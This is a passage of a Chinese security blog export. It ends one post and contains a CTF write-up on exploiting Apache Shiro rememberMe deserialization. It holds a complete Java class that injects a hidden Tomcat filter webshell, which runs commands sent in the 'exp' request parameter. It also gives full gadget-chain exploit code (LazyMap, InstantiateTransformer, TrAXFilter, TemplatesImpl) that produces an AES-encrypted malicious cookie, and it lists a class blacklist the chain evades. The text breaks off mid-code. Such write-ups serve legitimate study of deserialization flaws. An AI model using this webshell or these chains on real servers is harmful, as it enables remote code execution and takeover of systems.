class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tomcat_Echo_inject_Filter_cloader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            WebappClassLoaderBase  webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br>            System.out.println(standardContext);<br>            Tomcat_Echo_inject_Filter_cloader filter = <span class="hljs-keyword">new</span> Tomcat_Echo_inject_Filter_cloader();<br>            String name = <span class="hljs-string">&quot;ShellFilter&quot;</span>;<br>            FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>            filterDef.setFilter(filter);<br>            filterDef.setFilterName(name);<br>            filterDef.setFilterClass(filter.getClass().getName());<br>            standardContext.addFilterDef(filterDef);<br><br><br>            FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>            filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>            filterMap.setFilterName(name);<br>            filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>            standardContext.addFilterMapBefore(filterMap);<br><br><br>            java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>            java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);<br><br>            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);<br>            constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br>            filterConfigs.put(name, filterConfig);<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        String cmd = request.getParameter(<span class="hljs-string">&quot;exp&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        PrintWriter writer = response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();<br><br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                java.util.Scanner scanner = <span class="hljs-keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                String result = scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6d3ea230e6854991909a53885ec8261b.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>javaweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>车联网java题</title>
    <link href="/2022/05/20/2022-5-20-%E8%BD%A6%E8%81%94%E7%BD%91ezcc%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/05/20/2022-5-20-%E8%BD%A6%E8%81%94%E7%BD%91ezcc%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>这是一道shrio框架下反序列化的java题目，当时没打这个比赛，赛后来自己做下这个题目。个人感觉这道题很好的考察了关于CC链配合java8高版本的各种灵活运用。并且如果在初步调试了各个cc链之后，再来看这道题，能让本java废物对于CC的各个经典链子有更加熟悉的理解了。</p><p>附一张cc依赖各种链子的调用图</p><p><img src="https://img-blog.csdnimg.cn/e58fe2773c7b4808bc2f50d1d6e8f5d3.jpeg" alt="在这里插入图片描述"></p><h1 id="ezcc"><a href="#ezcc" class="headerlink" title="ezcc"></a>ezcc</h1><p>一些参考文章</p><h2 id="关于shrio的些东西"><a href="#关于shrio的些东西" class="headerlink" title="关于shrio的些东西"></a>关于shrio的些东西</h2><p>原理分析：根据shiro分析可以得到，主要存在几个重要的点:</p><blockquote><p>rememberMe cookie</p><p>CookieRememberMeManager.java</p><p>Base64</p><p>AES</p><p>加密密钥硬编码</p><p>Java serialization</p></blockquote><p>1.首先正常登录，然后生成带有rememberme的返回cookie值。</p><p>2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager</p><p>3.之后进入serialize，对登录认证信息进行序列化</p><p>4.然后加密，调用aes算法。</p><p>5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回</p><p>6.解析cookie</p><p>7.先解密在反序列化</p><p>8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码</p><p>9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager()这里用的是默认反序列化类,然后触发生成反序列化。</p><h2 id="题解分析"><a href="#题解分析" class="headerlink" title="题解分析"></a>题解分析</h2><p>禁用的类</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;blacklist&gt;<br>  &lt;regexp&gt;^org\.apache\.commons\.collections\.functors\.InvokerTransformer$&lt;/regexp&gt;<br>  &lt;regexp&gt;^org\.apache\.commons\.beanutils\.BeanComparator$&lt;/regexp&gt;<br>  &lt;regexp&gt;^org\.apache\.commons\.collections\.functors\.ConstantTransformer$&lt;/regexp&gt;<br>  &lt;regexp&gt;^java\.rmi\.server\.RemoteObjectInvocationHandler$&lt;/regexp&gt;<br>&lt;/blacklist&gt;<br></code></pre></div></td></tr></table></figure><p>首先shrio框架可以在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>类中找到密钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>。然后这题很明显就是寻找反序列化链子，查看依赖发现可利用的有<code>commons-collections3</code>和<code>commons-beanutils</code>，但是在<code>sk</code>里面ban了<code>InvokerTransformer$</code>,<code>ConstantTransformer$</code>,<code>BeanComparator$</code>,这些类，所以需要找到可以替换的类。</p><p>关于<code>InvokerTransformer</code>，可以替换成<code>InstantiateTransformer</code></p><p><img src="https://img-blog.csdnimg.cn/790c12c4d37e4b3b9f487d4a0dc117bc.png" alt="在这里插入图片描述"></p><p>然后我们注意到题目是tomcat服务，那么就存在<code>TemplatesImpl </code>这个利用点，然后还需要一个链来触发<code>TemplatesImpl </code>的<code>newTransformer</code>函数。所以如何触发<code>newTransformer</code>函数就成了关键。而熟悉的话就能想到<code>TrAXFilter</code>这个经常和<code>TemplatesImpl </code>出现在一起的类。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220524193059221.png" alt="image-20220524193059221"></p><h2 id="思路一（BadAttributeValueExpException-jdkLazyMap）"><a href="#思路一（BadAttributeValueExpException-jdkLazyMap）" class="headerlink" title="思路一（BadAttributeValueExpException+jdkLazyMap）"></a>思路一（BadAttributeValueExpException+jdkLazyMap）</h2><p>因为我对这个类很熟悉所以第一时间想到的只有这个类了。然后可以拼接<code>JDK1.8--LazyMap利用链</code>。通常的一个JDK1.8–LazyMap利用链如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">反序列化BadAttributeValueExpException<br>-&gt;BadAttributeValueExpException.readObject()<br>-&gt;TiedMapEntry.toString()<br>-&gt;TiedMapEntry.getValue()<br>-&gt;LazyMap.get()<br>-&gt;ChainedTransformer.transform()<br></code></pre></div></td></tr></table></figure><p>我们将</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">-&gt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>这里替换成<br>-&gt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>-&gt;TrAXFilter.<span class="hljs-constructor">TrAXFilter()</span><br>-&gt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>即可<br></code></pre></div></td></tr></table></figure><p>最终的调用栈就是</p><figure class="highlight livescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livescript">-&gt;BadAttributeValueExpException.readObject()<br>-&gt;TiedMapEntry.toString()<br>-&gt;TiedMapEntry.getValue()<br>-&gt;LazyMap.get()<br>-&gt;InstantiateTransformer.transform()<br>-&gt;TrAXFilter.TrAXFilter()<br>-&gt;TemplatesImpl.newInstance()<br></code></pre></div></td></tr></table></figure><p>编写exp</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        System.setProperty(<span class="hljs-string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-comment">//生成恶意代码</span><br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass =  classPool.makeClass(<span class="hljs-string">&quot;payload&quot;</span>);<br>        CtClass superClass = classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        CtConstructor constructor = ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br>        ctClass.writeFile();<br><br>        <span class="hljs-comment">//生成templatesImpl类</span><br>        TemplatesImpl templatesImpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">final</span> Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br><br>        ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>);<br><br>        InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[] &#123; templatesImpl &#125;);<br><br>        <span class="hljs-keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, constantTransformer);<br><br>        <span class="hljs-comment">//将map设置为LazyMap，key设为TrAXFilter.class为了后续可以调用TrAXFilter的初始化方法从而执行TemplatesImpl.transformer()函数</span><br>        TiedMapEntry tideMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, TrAXFilter.class);<br><br>        <span class="hljs-comment">//避免map.containsKey(key)为True，无法进入if循环，也就无法触发transform</span><br>        lazyMap.clear();<br><br>        Field field = LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(lazyMap,instantiateTransformer);<br><br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Field f = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        f.set(badAttributeValueExpException,tideMapEntry);<br><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br><br>        ByteArrayInputStream in = <span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(in);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] payloads = barr.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;7Bhs26ccN6i/0AT9GhZULF==&quot;</span>);<br>        ByteSource ciphertext = aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj,String key, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(key);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220524123747069.png" alt="image-20220524123747069"></p><h2 id="思路二-官方wp-JDK1-8-LazyMap-HashMap"><a href="#思路二-官方wp-JDK1-8-LazyMap-HashMap" class="headerlink" title="思路二(官方wp)JDK1.8-LazyMap+HashMap"></a>思路二(官方wp)JDK1.8-LazyMap+HashMap</h2><p>这里同样需要拼接JDK1.8-LazyMap，但是不同于上面就是没有使用BadAttributeValueExpException这个类。而是用了HashMap来触发</p><p>我是并没有想到用<code>TiedMapEntry</code>，虽然调试过，但可能就是浮于表面不熟悉，不太能灵活的运用。</p><p>JDK1.8–LazyMap利用链原本如下。其实就是为了解决Java高版本利用问题，需要在找上下文中是否还有其他调用<code>LazyMap#get()</code>的地方。</p><p>不同于上面的调用链的前半部分，这个链子是通过<code>TiedMapEntry</code>来调用<code>LazyMap#get()</code>。所以我们只需要更改后半部分的恶意代码执行类就行了。</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">/*<br>Gadget chain:<br>    java.io.ObjectInputStream.readObject()<br>            java.util.HashMap.readObject()<br>                java.util.HashMap.hash()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>                        org.apache.commons.collections.<span class="hljs-keyword">map</span>.LazyMap.get()<br>                            org.apache.commons.collections.functors.ChainedTransformer<span class="hljs-built_in">.transform</span>()<br>                            org.apache.commons.collections.functors.InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>                            java<span class="hljs-built_in">.lang</span>.reflect.Method.invoke()<br>                                java<span class="hljs-built_in">.lang</span>.Runtime.exec()<br>*/<br></code></pre></div></td></tr></table></figure><p>更改完的调用链，区别就在于前半部分</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">readObject</span><span class="hljs-params">()</span></span><br>-&gt;java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()<br>-&gt;java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hash</span>()<br>-&gt;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashcode</span>()<br>-&gt;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()<br>-&gt;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()<br>-&gt;org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InstantiateTransformer</span><span class="hljs-selector-class">.transform</span>()<br>-&gt;com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TrAXFilter</span><span class="hljs-selector-class">.TrAXFilter</span>()<br>-&gt;com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span><span class="hljs-selector-class">.TemplatesImpl</span><span class="hljs-selector-class">.newTransformer</span>()<br></code></pre></div></td></tr></table></figure><p>这里就不调试了，exp如下:</p><p>这里有个细节就是需要先设置一个无关紧要的transformer，最后再替换就行，防止expMap.put()操作发生报错。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ezcc.exp;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> 